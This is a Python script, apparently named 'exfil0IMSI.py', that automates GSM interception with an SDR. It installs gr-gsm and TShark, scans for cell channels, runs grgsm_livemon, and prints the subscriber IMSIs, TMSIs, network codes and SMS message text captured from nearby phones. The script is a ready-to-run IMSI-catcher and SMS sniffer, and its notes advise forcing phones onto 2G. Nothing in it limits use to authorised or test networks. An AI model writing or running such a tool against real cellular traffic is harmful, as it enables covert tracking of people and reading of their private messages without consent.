#!/usr/bin/env python3
"""
Final single-script GSM Wizard:

1) Checks dependencies (python3, gr-gsm, tshark).
2) Lets you pick SDR device: RTL-SDR, HackRF, BladeRF.
3) Runs grgsm_scanner --args <device>, parses discovered ARFCNs.
4) You pick which ARFCN to monitor.
5) Launches grgsm_livemon in background on that freq.
6) Runs TShark (line-buffered) to display:
   frame.time, e212.imsi, e212.mcc, e212.mnc, gsm_a.tmsi, gsm_sms.sms_text
7) Kills grgsm_livemon after TShark ends (Ctrl+C).

Usage:
  sudo python3 exfil0IMSI.py

Notes:
- If no data appears, ensure your phone is forced to 2G,
  or that you're on the correct ARFCN with strong signal.
- Scanning can hog the SDR until it fully exits. This script
  waits for scanning to exit, freeing the device.
- If still you see nothing, try manually running grgsm_livemon
  on that freq to confirm decoding, or check you have permission
  to read from the SDR.
"""

import subprocess
import sys
import re
import os
import time

def check_or_install_deps():
    """
    Checks or installs required packages:
      - python3
      - gr-gsm
      - tshark
    using a naive dpkg approach. Adapt to your distro if needed.
    """
    print("=== Checking Dependencies ===")
    packages = ["python3", "gr-gsm", "tshark"]
    missing = []
    for pkg in packages:
        cmd = ["dpkg", "-s", pkg]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            missing.append(pkg)

    if missing:
        print(f"Missing packages: {missing}")
        ans = input("Install them now via apt-get? [y/N]: ").strip().lower()
        if ans == "y":
            subprocess.run(["sudo", "apt-get", "update"])
            install_cmd = ["sudo", "apt-get", "install", "-y"] + missing
            subprocess.run(install_cmd)
        else:
            print("User declined installation. Exiting.")
            sys.exit(1)
    else:
        print("All required packages found or already installed.\n")

def pick_device():
    """
    Lets user pick from [RTL-SDR, HackRF, BladeRF].
    Returns the device arg for gr-gsm commands:
      "rtl", "hackrf", or "bladerf"
    """
    print("=== Select SDR Device ===")
    devices = [
        ("RTL-SDR",  "rtl"),
        ("HackRF",   "hackrf"),
        ("BladeRF",  "bladerf")
    ]
    for i, (name, dev_arg) in enumerate(devices, start=1):
        print(f"{i}) {name}")

    choice = input("Enter number [1-3]: ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(devices):
            raise ValueError()
    except ValueError:
        print("Invalid choice. Exiting wizard.")
        sys.exit(1)

    chosen = devices[idx]
    print(f"Selected: {chosen[0]}\n")
    return chosen[1]

def scan_for_channels(device_arg):
    """
    Run 'grgsm_scanner --args <device_arg>' synchronously.
    Parse lines that mention ARFCN & freq, store them in a list.
    """
    print("=== Scanning GSM Band ===")
    cmd = ["grgsm_scanner", "--args", device_arg]
    print("Command:", " ".join(cmd))
    print("(Press Ctrl+C to stop scanning early, partial results might appear.)\n")

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    channels = []
    # Typical line might be "ARFCN:  975, Freq:  925.2M, CID: 38001 ..."
    # We'll capture ARFCN/freq via regex
    regex = re.compile(r"ARFCN:\s+(\d+),\s+Freq:\s+([\d\.]+[MG])")

    try:
        for line in process.stdout:
            line_s = line.strip()
            match = regex.search(line_s)
            if match:
                arfcn = match.group(1)
                freq  = match.group(2)
                channels.append((arfcn, freq))
                print("Found:", line_s)
    except KeyboardInterrupt:
        print("Scan interrupted by user.\n")

    process.wait()  # ensure scanner fully exits & frees SDR
    err = process.stderr.read().strip()
    if err:
        print("[grgsm_scanner stderr]:", err)

    return channels

def pick_channel(channels):
    """
    Show a list of discovered (arfcn, freq) pairs,
    let user pick which to monitor.
    """
    if not channels:
        print("\nNo channels found. Exiting wizard.")
        sys.exit(0)

    print("\n=== Available Channels Discovered ===")
    for i, (arfcn, freq) in enumerate(channels, start=1):
        print(f"{i}) ARFCN={arfcn}, Frequency={freq}")

    choice = input("Which channel? (Enter number): ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(channels):
            raise ValueError()
    except ValueError:
        print("Invalid selection. Exiting.")
        sys.exit(1)

    sel = channels[idx]
    print(f"\nSelected ARFCN={sel[0]}, freq={sel[1]}")
    return sel

def run_livemon_in_bg(device_arg, freq_str):
    """
    Convert freq_str like '925.2M' -> '925.2e6', run grgsm_livemon in bg.
    """
    freq_e = freq_str.replace("M", "e6").replace("G", "e9")
    cmd = ["grgsm_livemon", "--args", device_arg, "-f", freq_e]
    print("\n=== Starting grgsm_livemon in Background ===")
    print("Command:", " ".join(cmd))

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setpgrp
    )
    time.sleep(2)
    print("grgsm_livemon started. If signal is weak, no data might appear.\n")
    return proc

def run_tshark_capture():
    """
    TShark line-buffered capture for:
      frame.time, e212.imsi, e212.mcc, e212.mnc, gsm_a.tmsi, gsm_sms.sms_text
    Press Ctrl+C to stop.
    """
    print("=== Running TShark Capture ===\n")
    cmd = [
        "tshark",
        "-i", "lo",
        "-f", "port 4729 and not icmp and udp",
        "-l",  # line-buffered
        "-Y", "(e212.imsi or e212.mcc or e212.mnc or gsm_a.tmsi or gsm_sms.sms_text)",
        "-T", "fields",
        "-e", "frame.time",
        "-e", "e212.imsi",
        "-e", "e212.mcc",
        "-e", "e212.mnc",
        "-e", "gsm_a.tmsi",
        "-e", "gsm_sms.sms_text",
        "-E", "header=y",
        "-E", "separator=,",
        "-E", "quote=d"
    ]
    print("Command:", " ".join(cmd), "\n")

    with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1) as proc:
        try:
            for line in proc.stdout:
                print(line, end='')
        except KeyboardInterrupt:
            print("\nInterrupted TShark.")
            proc.terminate()

        proc.wait()
        err = proc.stderr.read().strip()
        if err:
            print("[TShark stderr]:", err)

def main():
    print("=== GSM Wizard (CLI) ===\n")

    # 1) Check dependencies
    check_or_install_deps()

    # 2) Pick device
    dev_arg = pick_device()

    # 3) Scan channels
    channels = scan_for_channels(dev_arg)

    # 4) Pick channel
    (arfcn, freq) = pick_channel(channels)

    # 5) Launch livemon in background
    livemon_proc = run_livemon_in_bg(dev_arg, freq)

    # 6) TShark capture
    run_tshark_capture()

    # 7) Terminate livemon
    print("\nStopping grgsm_livemon if still running.")
    try:
        livemon_proc.terminate()
    except:
        pass
    print("Wizard done. Exiting.\n")

if __name__ == "__main__":
    main()
